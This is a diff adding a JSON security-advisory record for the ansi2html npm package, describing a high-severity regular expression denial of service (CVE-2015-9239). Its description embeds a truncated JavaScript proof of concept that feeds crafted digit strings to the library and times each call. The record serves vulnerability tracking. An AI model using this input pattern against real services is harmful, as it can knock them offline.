@@ -1,0 +1,32 @@
+{
+  "packageName": "ansi2html",
+  "lastUpdated": "2026-05-04T13:06:56.926Z",
+  "vulnerabilities": [
+    {
+      "id": "GHSA-c2v2-7rcg-2ch7",
+      "packageName": "ansi2html",
+      "title": "Regular Expression Denial of Service in ansi2html",
+      "description": "The `ansi2html` package is affected by a regular expression denial of service vulnerability when certain types of user input is passed in.\n\n\n## Proof of concept\n```\nvar ansi2html = require('ansi2html')\n\nvar start = process.hrtime();\nansi2html(\"[1111111111111111111111;0000000000000000000000\");\nconsole.log(process.hrtime(start));\n\nstart = process.hrtime();\nansi2html(\"[1111111111111111111111;00000000000000000000000\");\nconsole.log(process.hrtime(start));\n\nstart = process.hrtime();\nansi2html(\"[111111",
+      "severity": "high",
+      "url": "https://github.com/advisories/GHSA-c2v2-7rcg-2ch7",
+      "publishedAt": "2020-09-01T15:17:48Z",
+      "modifiedAt": "2023-01-09T05:03:49Z",
+      "identifiers": [
+        {
+          "type": "GHSA",
+          "value": "GHSA-c2v2-7rcg-2ch7"
+        },
+        {
+          "type": "CVE",
+          "value": "CVE-2015-9239"
+        }
+      ],
+      "affectedVersions": [
+        {
+          "range": ">= 0.0.0"
+        }
+      ],
+      "source": "github"
+    }
+  ]
+}
